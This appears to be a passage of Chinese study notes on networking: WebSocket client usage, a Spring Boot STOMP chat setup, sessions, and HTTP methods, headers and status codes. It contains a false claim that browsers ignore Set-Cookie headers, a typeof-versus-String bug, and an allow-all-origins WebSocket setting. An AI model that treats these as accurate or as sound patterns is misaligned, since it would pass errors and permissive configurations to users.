    "body": "# 无线电波\n## 概述\n无线电波无处不在： 广播电视、移动电话、Wi-Fi、蓝牙、遥控等\n\n# 怎么检测笔记本的网卡是否支持5G的wifi?\n输入命令“netsh wlan show drivers”按Enter键执行，查看【支持的无线电 类型】一项，可以看到的无线网卡支持的类型\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125222.png)\n\n无线网卡支持的无线协议标准（无线模式）中，\n- 如果只有802.11 b/g/n，说明该网卡不支持5GHz；\n- 如果包含了802.11a或者802.11ac，说明该网卡支持5GHz\n\n# 什么是网络分层以及对应的设备\n网络的分层就是就是不同层对网络传输的二进制代码做不同的处理。而这个处理过程需要软硬件来实现，这个软硬件就对应着网络设备。例如数据链路层中的交换机设备就是对物理层处理过后的网络传输的二进制代码进行处理。\n\n> 核心观点：网络设备就是对网络传输的二进制代码进行处理加工，然后进行传送\n\n# 冲突域和广播域的区别\n<div class=\"contianer\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/qsy333797po\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"contianer\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/BfY4xTIVPwY\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n# 网络传输过程以及内网穿透\n\n<div class=\"contianer\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/-i5iKTzGTc0\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"contianer\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/qsy333797po\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n> 路由器中的NAT对应规则，有两个实现方式。\n> 一种是路由器自动配置规则，当局域网内部的主机某端口通过路由器与外界互联网进行连接时，路由器会自动配置该主机端口的相关NAT映射关系，但是当主机的该端口与外界互联网断开连接时，路由器会取消该此端口的NAT映射关系\n> 另一种是手动在路由器上进行配置\n\n# WebSocket\nWebSocket 是一种网络通信协议，很多高级功能都需要它。\nWebSocket 是HTML5开始提供的一种在单个TCP连接上进行全双工通讯的协议。\n\n## 为什么需要 WebSocket？\n初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？\n答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。\n举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。\n\n这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用\"轮询\"：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。\n轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。\n\n## 简介\nWebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。\n它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125231.png)\n\n其他特点包括：\n（1）建立在 TCP 协议之上，服务器端的实现比较容易。\n（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n（3）数据格式比较轻量，性能开销小，通信高效。\n（4）可以发送文本，也可以发送二进制数据。\n（5）没有同源限制，客户端可以与任意服务器通信。\n（6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。\n```\nws://example.com:80/some/path\n```\n\n##  WebSocket 握手\n我们来看个典型的 WebSocket 握手\n```\nGET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n```\n熟悉 HTTP 的童鞋可能发现了，这段类似 HTTP 协议的握手请求中，多了这么几个东西。\n```\nUpgrade: websocket\nConnection: Upgrade\n```\n这个就是 WebSocket 的核心了，告诉 Apache 、 Nginx 等服务器：注意啦，我发起的请求要用 WebSocket 协议，快点帮我找到对应的助理处理~而不是那个老土的 HTTP。\n```\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\n```\n首先， Sec-WebSocket-Key 是一个 Base64 encode 的值，这个是浏览器随机生成的，告诉服务器：泥煤，不要忽悠我，我要验证你是不是真的是 WebSocket 助理。\n然后， Sec_WebSocket-Protocol 是一个用户定义的字符串，用来区分同 URL 下，不同的服务所需要的协议。简单理解：今晚我要服务A，别搞错啦~\n\n最后， Sec-WebSocket-Version 是告诉服务器所使用的 WebSocket Draft （协议版本），在最初的时候，WebSocket 协议还在 Draft 阶段，各种奇奇怪怪的协议都有，而且还有很多期奇奇怪怪不同的东西，什么 Firefox 和 Chrome 用的不是一个版本之类的，当初 WebSocket 协议太多可是一个大难题。。不过现在还好，已经定下来啦~大家都使用同一个版本：服务员，我要的是13岁的噢\n\n然后服务器会返回下列东西，表示已经接受到请求， 成功建立 WebSocket 啦！\n```\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n```\n这里开始就是 HTTP 最后负责的区域了，告诉客户，我已经成功切换协议啦~\n```\nUpgrade: websocket\nConnection: Upgrade\n```\n依然是固定的，告诉客户端即将升级的是 WebSocket 协议，而不是 mozillasocket，lurnarsocket 或者 shitsocket。\n然后， Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的 Sec-WebSocket-Key 。服务器：好啦好啦，知道啦，给你看我的 ID CARD 来证明行了吧。\n后面的， Sec-WebSocket-Protocol 则是表示最终使用的协议。\n至此，HTTP 已经完成它所有工作了，接下来就是完全按照 WebSocket 协议进行了。\n\n## 客户端的简单示例\nWebSocket 的用法相当简单。\n下面是一个网页脚本的例子，基本上一眼就能明白。\n```js\nvar ws = new WebSocket(\"wss://echo.websocket.org\");\n\nws.onopen = function(evt) { \n  console.log(\"Connection open ...\"); \n  ws.send(\"Hello WebSockets!\");\n};\n\nws.onmessage = function(evt) {\n  console.log( \"Received Message: \" + evt.data);\n  ws.close();\n};\n\nws.onclose = function(evt) {\n  console.log(\"Connection closed.\");\n};      \n```\n\n## 客户端的 API\nWebSocket 客户端的 API 如下。\n###  WebSocket 构造函数\nWebSocket 对象作为一个构造函数，用于新建 WebSocket 实例。\n```js\nvar ws = new WebSocket('ws://localhost:8080');\n```\n执行上面语句之后，客户端就会与服务器进行连接。\n\n### webSocket.readyState\n`readyState`属性返回实例对象的当前状态，共有四种。\n- CONNECTING：值为0，表示正在连接。\n- OPEN：值为1，表示连接成功，可以通信了。\n- CLOSING：值为2，表示连接正在关闭。\n- CLOSED：值为3，表示连接已经关闭，或者打开连接失败。\n下面是一个示例。\n```js\nswitch (ws.readyState) {\n  case WebSocket.CONNECTING:\n    // do something\n    break;\n  case WebSocket.OPEN:\n    // do something\n    break;\n  case WebSocket.CLOSING:\n    // do something\n    break;\n  case WebSocket.CLOSED:\n    // do something\n    break;\n  default:\n    // this never happens\n    break;\n}\n```\n\n### webSocket.onopen\n实例对象的onopen属性，用于指定连接成功后的回调函数。\n```js\nws.onopen = function () {\n  ws.send('Hello Server!');\n}\n如果要指定多个回调函数，可以使用addEventListener方法。\n\nws.addEventListener('open', function (event) {\n  ws.send('Hello Server!');\n});\n```\n\n### webSocket.onclose\n实例对象的onclose属性，用于指定连接关闭后的回调函数。\n```js\nws.onclose = function(event) {\n  var code = event.code;\n  var reason = event.reason;\n  var wasClean = event.wasClean;\n  // handle close event\n};\n\nws.addEventListener(\"close\", function(event) {\n  var code = event.code;\n  var reason = event.reason;\n  var wasClean = event.wasClean;\n  // handle close event\n});\n```\n\n### webSocket.onmessage\n实例对象的onmessage属性，用于指定收到服务器数据后的回调函数。\n```js\nws.onmessage = function(event) {\n  var data = event.data;\n  // 处理数据\n};\n\nws.addEventListener(\"message\", function(event) {\n  var data = event.data;\n  // 处理数据\n});\n```\n注意，服务器数据可能是文本，也可能是二进制数据（blob对象或Arraybuffer对象）。\n```js\nws.onmessage = function(event){\n  if(typeof event.data === String) {\n    console.log(\"Received data string\");\n  }\n\n  if(event.data instanceof ArrayBuffer){\n    var buffer = event.data;\n    console.log(\"Received arraybuffer\");\n  }\n}\n```\n除了动态判断收到的数据类型，也可以使用binaryType属性，显式指定收到的二进制数据类型。\n```js\n// 收到的是 blob 数据\nws.binaryType = \"blob\";\nws.onmessage = function(e) {\n  console.log(e.data.size);\n};\n\n// 收到的是 ArrayBuffer 数据\nws.binaryType = \"arraybuffer\";\nws.onmessage = function(e) {\n  console.log(e.data.byteLength);\n};\n```\n### webSocket.send()\n实例对象的send()方法用于向服务器发送数据。\n发送文本的例子。\n```js\nws.send('your message');\n```\n发送 Blob 对象的例子。\n```js\nvar file = document\n  .querySelector('input[type=\"file\"]')\n  .files[0];\nws.send(file);\n```\n发送 ArrayBuffer 对象的例子。\n```js\n// Sending canvas ImageData as ArrayBuffer\nvar img = canvas_context.getImageData(0, 0, 400, 320);\nvar binary = new Uint8Array(img.data.length);\nfor (var i = 0; i < img.data.length; i++) {\n  binary[i] = img.data[i];\n}\nws.send(binary.buffer);\n```\n### webSocket.bufferedAmount\n实例对象的bufferedAmount属性，表示还有多少字节的二进制数据没有发送出去。它可以用来判断发送是否结束。\n```js\nvar data = new ArrayBuffer(10000000);\nsocket.send(data);\n\nif (socket.bufferedAmount === 0) {\n  // 发送完毕\n} else {\n  // 发送还没结束\n}\n```\n### webSocket.onerror\n实例对象的onerror属性，用于指定报错时的回调函数。\n```js\nsocket.onerror = function(event) {\n  // handle error event\n};\n\nsocket.addEventListener(\"error\", function(event) {\n  // handle error event\n});\n```\n\n## WebSocket多人在线聊天室\n### 新建工程\n我们新建一个SpringBoot2的项目工程，在默认依赖中，添加websocket依赖：\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n```\n\n### WebSocket 配置\n```java\n@Configuration\n@EnableWebSocketMessageBroker //@EnableWebSocketMessageBroker用于启用我们的WebSocket服务器。\npublic class WebSocketConfig implements WebSocketMessageBrokerConfigurer {\n\n\t@Value(\"{jwt.tokenHead}\")\n\tprivate String tokenHead;\n\t@Autowired\n\tprivate JwtTokenUtil jwtTokenUtil;\n\t@Autowired\n\tprivate UserDetailsService userDetailsService;\n\n\t/**\n\t * 添加这个Endpoint, 这样在网页可以通过websocket连接上服务\n\t * 也就是我们配置websocket的服务地址，并且可以指定是否使用socketJS\n\t *\n\t * 方法名中的STOMP是来自Spring框架STOMP实现。 STOMP代表简单文本导向的消息传递协议。它是一种消息传递协议，用于定义数据交换的格式和规则。为啥我们需要这个东西？因为WebSocket只是一种通信协议。它没有定义诸如以下内容：如何仅向订阅特定主题的用户发送消息，或者如何向特定用户发送消息。我们需要STOMP来实现这些功能。\n\t * @param registry\n\t */\n\t@Override\n\tpublic void registerStompEndpoints(StompEndpointRegistry registry) {\n\t\t/**\n\t\t * 1. addEndpoint(\"/ws/ep\"): 将ws/ep路径注册为stomp的端点，用户连接了这个端点就可以进行websocket通讯，支持socketJS\n\t\t * 2. setAllowedOrigins(\"*\")：设置有哪些地址能访问，‘*’表示所有地址都能\n\t\t * 3. withSockJS()：支持socketJS访问\n\t\t */\n\t\tregistry.addEndpoint(\"/ws/ep\").setAllowedOrigins(\"*\").withSockJS();\n\t}\n\n\t/**\n\t * 使用了jwt时，需要进行这个配置\n\t * 输入通道参数配置\n\t * @param registration\n\t */\n\t@Override\n\tpublic void configureClientInboundChannel(ChannelRegistration registration) {\n\t\tregistration.interceptors(new ChannelInterceptor() {\n\t\t\t@Override\n\t\t\tpublic Message<?> preSend(Message<?> message, MessageChannel channel) {\n\t\t\t\tStompHeaderAccessor accessor = MessageHeaderAccessor.getAccessor(message, StompHeaderAccessor.class);\n\n\t\t\t\t//判断是否为连接，如果是，需要获取token，并且设置用户对象\n\t\t\t\tif(StompCommand.CONNECT.equals(accessor.getCommand())){\n\t\t\t\t\tString token = accessor.getFirstNativeHeader(\"Auth-Token\");\n\t\t\t\t\tif(token != null && !token.equals(\"\")){\n\t\t\t\t\t\tString autoToken = token.substring(tokenHead.length());\n\t\t\t\t\t\tString username = jwtTokenUtil.getUserNameFromToken(autoToken);\n\t\t\t\t\t\t//如果token中存在用户名\n\t\t\t\t\t\tif(username != null && !username.equals(\"\")){\n\t\t\t\t\t\t\t//登陆\n\t\t\t\t\t\t\tUserDetails userDetails = userDetailsService.loadUserByUsername(username);\n\t\t\t\t\t\t\t//验证token是否有效，如果有效，则重新设置用户对象, 并且将该用户对象添加到accessor中\n\t\t\t\t\t\t\tif(jwtTokenUtil.validateToken(autoToken, userDetails)){\n\t\t\t\t\t\t\t\tUsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());\n\t\t\t\t\t\t\t\tSecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);\n\t\t\t\t\t\t\t\taccessor.setUser(usernamePasswordAuthenticationToken);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn message;\n\t\t\t}\n\t\t});\n\t}\n\n\t/**\n\t * 配置消息代理, 用于将消息从一个客户端路由到另一个客户端。\n\t * @param registry\n\t */\n\t@Override\n\tpublic void configureMessageBroker(MessageBrokerRegistry registry) {\n\t\t//定义了以“/queue”开头的消息目的地消息应该路由到消息代理。消息代理向订阅特定主题的所有连接客户端广播消息\n\t\tregistry.enableSimpleBroker(\"/queue\");\n\t}\n}\n\n```\n### 创建 ChatMessage 实体\n```java\n@Data\n@EqualsAndHashCode(callSuper = false)\n@Accessors(chain = true)\npublic class ChatMsg {\n\t//信息来自哪\n\tprivate String from;\n\t//信息发往哪\n\tprivate String to;\n\t//信息的内容\n\tprivate String content;\n\t//时间\n\tprivate LocalDateTime date;\n\t//昵称\n\tprivate String formNickName;\n}\n```\n### 创建Controller来接收和发送消息\n```java\n@Controller\npublic class WsController {\n\t@Autowired\n\tprivate SimpMessagingTemplate simpMessagingTemplate;\n\n\t@MessageMapping(\"/ws/chat\")\n\tpublic void handleMsg(Authentication authentication, ChatMsg chatMsg){\n\t\tAdmin admin = (Admin) authentication.getPrincipal();\n\t\tchatMsg.setFrom(admin.getUsername());\n\t\tchatMsg.setFormNickName(admin.getName());\n\t\tchatMsg.setDate(LocalDateTime.now());\n\n\t\t//第二个参数表示信息的目的地，其中前缀\"queue\"是我们在WebSocketConfig中配置消息代理中设置的\n\t\tsimpMessagingTemplate.convertAndSendToUser(chatMsg.getTo(), \"/queue/chat\", chatMsg);\n\t}\n}\n```\n\n# session域\n## java后端的session域\n用户请求服务器有下列2种情况\n- **请求头中没有cookie或者是cookie中没有JSESSIONID时**：服务器会为用户生成一个独一无二的session对象，并且每个session对象都会有一个唯一的sessionId(用于区分其他的session对象)，服务器也会因此产生一个cookie，并且该cookie的中属性名为JSESSIONED的属性值为服务端sessionID的值；然后服务器会在响应客户端的同时，将该cookie发送给客户端；至此客户端就有了一个cookie(JESEESIONID)；因此从而达到客户端的cookie就可以和服务端的session对象一一对应起来( JSESSIONID <--> sessionID )；\n- **请求头含有cookie且有JSESSIONID属性时**：服务器会先用客户端的cookies中的JSESSIONID去和服务端中的sessionID匹配，如果匹配成功，则说明用户在服务端就能使用该sessionID对应的sessionID域\n \n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125243.png)\n\n> 注：浏览器是不会自动设置cookie的。所以当Response Header中含有Set-Cookie时，浏览器不会自动根据Set-Cookie来设置Cookie，而是需要写相对应的代码来设置Cookie\n\n# HTTP\n## HTTP幂等\n一个HTTP方法是幂等的，指的是同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下， GET ， HEAD ， PUT 和 DELETE  等方法都是幂等的，而  POST  方法不是。所有的 safe 方法也都是幂等的。\n\n幂等性只与后端服务器的实际状态有关，而每一次请求接收到的状态码不一定相同。例如，第一次调用 DELETE 方法有可能返回 200 ，但是后续的请求可能会返回 404 。 DELETE 的言外之意是，开发者不应该使用 DELETE 法实现具有删除最后条目功能的 RESTful API。\n\n需要注意的是，服务器不一定会确保请求方法的幂等性，有些应用可能会错误地打破幂等性约束。\n\nGET /pageX HTTP/1.1 幂等的。连续调用多次，客户端接收到的结果都是一样的：\n```\nGET /pageX HTTP/1.1\nGET /pageX HTTP/1.1\nGET /pageX HTTP/1.1\nGET /pageX HTTP/1.1\n```\n\nPOST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录：\n```\nPOST /add_row HTTP/1.1\nPOST /add_row HTTP/1.1   -> Adds a 2nd row\nPOST /add_row HTTP/1.1   -> Adds a 3rd row\n```\n\nDELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样：\n```\nDELETE /idX/delete HTTP/1.1   -> Returns 200 if idX exists\nDELETE /idX/delete HTTP/1.1   -> Returns 404 as it just got deleted\nDELETE /idX/delete HTTP/1.1   -> Returns 404\n```\n\n## HTTP报文\n用于HTTP协议交互的信息被称为HTTP报文, 是HTTP通信基本单位，由8位组字节流组成，通过HTTP通信传输。请求端的叫请求报文，服务端的叫响应报文。是由多行(CR+LF作为换行符)数据构成的字符串文本\n```\nHTTP报文= 报文首部 + 报文主体(非必要)\n```\n- 请求行： 包含请求的方法，请求的URI, HTTP 版本\n- 响应行： 响应结果的状态码，原因短语，HTTP 版本\n- 首部字段： 包含表示请求和响应的各种条件和属性的各类首部（通用首部，响应首部，请求首部和实体首部）, RFC2616中定义了47种首部字段\n- 其他：在HTTP协议通信交互中使用到的首部字段不限于RFC2616中定义的47种，还有一些非正式的首部字段，比如Cookie、Set-Cookie和Content-Disposition等，统一归纳在RFC4229 HTTP Header Field Registrations中。\n- 报文主体：即请求体与响应体\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125253.png)\n\n## HTTP实体\n`实体(entity)`: 作为请求和响应的有效载荷数据(补充项)被传输，其内容由实体首部+实体主体组成。\n\nHTTP实体的组成：实体首部和实体主体 \n报文实体的组成：\n- 实体头部：描述了HTTP报文的内容 \n- 实体主体：实体主体即http报文原始数据 \n\n**报文主体和实体主体的区别：**\n- HTTP报文的主体：用于传输请求和响应的实体主体。\n- 报文主体通常等于实体主体，如果传输过程中进行了编码操作，实体内容发生变化，才回导致和报文主体产生差异\n\n## HTTP请求报文结构\nHTTP请求报文 一个HTTP请求报文由请求行（request line）、请求头部（header）、空行和请求数据/请求体(request-body)4个部分组成,下图给出了请求报文的一般格式。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125302.png)\n\n**1. 请求行(request-line)**\n请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。例如，GET /index.html HTTP/1.1。\n\n**2. 请求头部(request-header)**\n请求头部由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。请求头部通知服务器有关于客户端请求的信息，典型的请求头有：\n- User-Agent：产生请求的浏览器类型。\n- Accept：客户端可识别的内容类型列表。\n\n**3. 空行(blank-line)**\n最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头\n\n**4. 请求数据/请求体(request-body)**\n请求数据不在GET方法中使用，而是在POST方法中使用。POST方法适用于需要客户填写表单的场合。与请求数据相关的最常使用的请求头是Content-Type和Content-Length。\n<font color=\"red\">请求参数格式为`Form Data`与`Request Payload`的数据都是放在请求体中</font>\n\n## HTTP响应报文结构\nHTTP响应也由四个部分组成，分别是：状态行(status-line)、响应头部(response-headers)、空行和响应数据/响应体(response-body)。\n下图给出了响应报文的一般格式\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125312.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125330.png)\n\n正如你所见，响应报文与请求报文的唯一区别在于第一行中用状态信息代替了请求信息。状态行（status line）通过提供一个状态码来说明所请求的资源情况。\n\n状态行由3部分组成，分别为：协议版本，状态码，状态码描述，之间由空格分隔, 例如：HTTP/1.1 200 OK\n\n## HTTP请求方式method\nHTTP协议中的请求方法（有时也叫“动作”），用来表明对Request-URL指定的资源的不同操作方式。\nHTTP1.0中定义了三种请求方法：GET，POST和HEAD。\nHTTP1.1中新增了六种请求方法：OPTIONS，PUT，DELETE，TRACE和CONNECT，PATCH。\n\n- `GET`: 请求指定页面信息，并返回实体主体\n- `HEAD`: 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头\n- `POST`: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。\n- `PUT`: 从客户端向服务器传送的数据取代指定的文档的内容。\n- `DELETE`: 请求服务器删除指定的数据。\n- `CONNECT`: HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。\n- `OPTIONS`: 允许客户端查看服务器的性能\n- `TRACE`: 回显服务器收到的请求，主要用于测试或诊断。\n- `PATCH`: 是对PUT方法的补充，用来对已知资源进行局部更新 。\n\n**post、put与patch之间的区别**\nPOST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源.但实际上两者都可以用来创建或是更新数据.单从技术上来说,他们并没有什么区别.但是在HTTP规范中POST是非等幂的,多次调用会产生不同的结果,比如:创建一个用户,由于网络原因或是其他原因多创建了几次,那么将会有多个用户被创建.而PUT id/456则会创建一个id为456的用户,多次调用还是会创建的结果是一样的,所以PUT是等幂的.\nPATCH一般是用来局部更新资源的,假设我们有一个UserInfo，里面有userId， userName， userGender等10个字段。可你的编辑功能因为需求，在某个特别的页面里只能修改userName，这时候的更新怎么做？\n人们通常(为徒省事)把一个包含了修改后userName的完整userInfo对象传给后端，做完整更新。但仔细想想，这种做法感觉有点二，而且真心浪费带宽(纯技术上讲，你不关心带宽那是你土豪)。\n于是PATCH诞生，只传一个userName到指定资源去，表示该请求是一个局部更新，后端仅更新接收到的字段。\n而PUT虽然也是更新资源，但要求前端提供的一定是一个完整的资源对象，理论上说，如果你用了PUT，但却没有提供完整的UserInfo，那么缺了的那些字段应该被清空.另外PUT会有一个create操作,加入更新的id不存在,会进行创建,而PATCH则没有这个.\n\n**注意：**\n- 当某个资源被请求，但该资源不支持其使用的请求方法时，服务器应当返回状态码405（Mothod Not Allowed）；当服务器不认识或者不支持对应的请求方法时，应返回状态码501（Not Implemented）。\n- HTTP服务器至少应该实现GET和HEAD/POST方法，其他方法都是可选的，此外除上述方法，特定的HTTP服务器支持扩展自定义的方法。\n- 大部分时候，我们需要使用的只有GET和POST，但是在REST风格的框架中，就需要根据对资源所要做的操作而选择使用POST、DELETE、PUT、GET，对应CURD（增删改查四种基本操作Create、Update、Read、Delete）。\n\n## HTTP请求参数格式\nHTTP请求的参数格式有三种：`Query String Parameters`、`Form Data`、`Request Payload`\n请求参数格式受 请求方法 与 content-type 影响\n\n### Query String Parameters\nget请求的请求参数格式**一定**是`Query String Parameters`, 无论content-type设置成什么，都不会改变请求参数格式\n当发起一次GET请求时，参数会以url string的形式进行传递。即?后的字符串则为其请求参数，并以&作为分隔符。如下http请求报文：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125338.png)\n\n**此时的请求中的请求体为空**\n\n### Form Data\n当发起一次POST请求时，若未指定content-type，则默认content-type为application/x-www-form-urlencoded。即参数会以Form Data的形式进行传递，不会显式出现在请求url中。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125347.png)\n\n**此时的请求中的请求体中的数据是一个个键值对**\n\n### Request Payload\n当发起一次POST请求时，若content-type为application/json，则参数会以Request Payload的形式进行传递（显然的，数据格式为JSON），不会显式出现在请求url中。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125357.png)\n\n**此时的请求中的请求体中的数据就是一个json数据**\n\n### 同时发送不同类型的请求参数\n同时发送Query String Parameters与Request Payload类型参数\n```js\n$.ajax({\n  url: 'http://www.baidu.coff?name=aaa',\n  type: 'post',\n  dataType: 'json',\n  data: JSON.stringify({data: {status: \"start\"}}),\n  headers: {\n    'Content-Type': 'application/json'\n  }\n});\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220323100334.png)\n\n同时发送Query String Parameters与Form Data类型参数\n```js\n$.ajax({\n  url: 'http://www.baidu.coff?name=aaa',\n  type: 'post',\n  data: {status: \"start\"},\n});\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220323100647.png)\n\n\n**注意：get请求的请求参数格式一定有且只为Query String Parameters。如下:**\n```js\n$.ajax({\n  url: 'http://www.baidu.coff?name=aaa',\n  type: 'get',\n  data: {status: \"start\"},\n});\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220323100913.png)\n\n```js\n$.ajax({\n  url: 'http://www.baidu.coff?name=aaa',\n  type: 'get',\n  data: JSON.stringify({data: {status: \"start\"}}),\n  headers: {\n    'Content-Type': 'application/json'\n  }\n});\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220323101032.png)\n\n## HTTP响应状态码 \n状态码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值\n- 1xx：指示信息--服务器收到请求，需要请求者继续执行操作\n- 2xx：成功--表示请求已被成功接收、理解、接受。\n- 3xx：重定向--要完成请求必须进行更进一步的操作。\n- 4xx：客户端错误--请求有语法错误或请求无法实现。\n- 5xx：服务器端错误--服务器在处理请求的过程中发生了错误\n\n常见状态码、状态描述的说明如下：\n- `200 OK`：客户端请求成功\n- `204 No Content`：无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\n- `206 Partial Content`：部分内容。服务器成功处理了部分GET请求\n- `301 Moved Permanently`：永久性重定向。 表示请求的资源已被永久分配了新的URI。 可以简单理解为该资源已经被永久改变了位置\n- `302 Found`：临时性重定向。表示资源被临时改变位置并分配了新的URI\n- `304 Not Modified`：如果客户端发送了一个带条件的GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个304状态码\n- `400 Bad Request`：客户端请求有语法错误，不能被服务器所理解\n- `401 Unauthorized`：请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用\n- `403 Forbidden`：服务器收到请求，但是拒绝提供服务（认证失败）\n- `404 Not Found`：请求资源不存在，举个例子：输入了错误的URL\n- `405\tMethod Not Allowed`: 客户端请求中的方法被禁止\n- `407 Proxy Authentication Required`: 与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。\n- `500 Internal Server  Error`：服务器发生错误\n- `503 Server Unavailable`：服务器当前不能处理客户端的请求，一段时间后可能恢复正常\n\n更多状态码见：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status\n\n## HTTP报文头\nHTTP1.1规定的首部字段，其细分可分为`通用报头字段`、`请求报头字段`、`响应报头字段`、`实体报头字段`与`其他报头字段`\nhttp请求报文的报头结构：通用报头|请求报头|实体报头|其他报头字段\nhttp响应报文的报头结构：通用报头|响应报头|实体报头|其他报头字段\n\n### 通用报头字段\n通用报头字段(共9种)在请求头和响应头都会使用到\n| 首部字段            | 解释                       |\n| ------------------- | -------------------------- |\n| 1.Cache-Control     | 控制缓存的行为             |\n| 2.Connection        | 逐跳首部、连接的管理       |\n| 3.Date              | 创建报文的日期和时间       |\n| 4.Pragma            | 报文指令                   |\n| 5.Trailer           | 报文未端的首部一览         |\n| 6.Transfer-Encoding | 指定报文主体的传输编码方式 |\n| 7.Upgrade           | 升级为其他协议             |\n| 8.Via               | 代理服务器的相关信息       |\n| 9.Warning           | 错误通知                   |\n\n下面我们来看挑几个重要的属性来看下~\n#### Cache-Control\n用来操作缓存的工作机制，下方截图响应头中的的Cache-Control的参数为private和max-age=10。private缓存是私有的，仅像特定用户提供相应的缓存信息。如果是public，那么就意味着可向任意方提供相应的缓存信息。max-age = 10表示缓存有效期为10秒。从下方的Expires(过期时间)和Last-Modified(最后修改时间)就可以看出，这两者之间的差值正好是10秒。\n\n该字段还可以对应其他的参数：\n- `no-cache`：如果是客户端的话，说明客户端不会接收缓存过的响应，要请求最新的内容。而服务器端则表示缓存服务器不能对相应的资源进行缓存。\n- `no-store`：表示缓存不能在本地存储。\n- `max-age`：该参数后方会被赋值上相应的秒数，在请求头中表示如果缓存时间没有超过这个值就返回给我。而在响应头中时，则表示资源在缓存服务器中缓存的最大时间。\n- `only-if-cached`：表示客户端仅仅请求缓存服务器上的内容，如果缓存服务器上没有请求的内容，那么返回504 Gateway Timeout。\n- `must-revalidata`：表示缓存服务器在返回资源是，必须向资源服务器确认其缓存的有效性。\n- `no-transform`：无论请求还是响应，都不能在传输的过程中改变报文体的媒体类型。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125410.png)\n\n#### 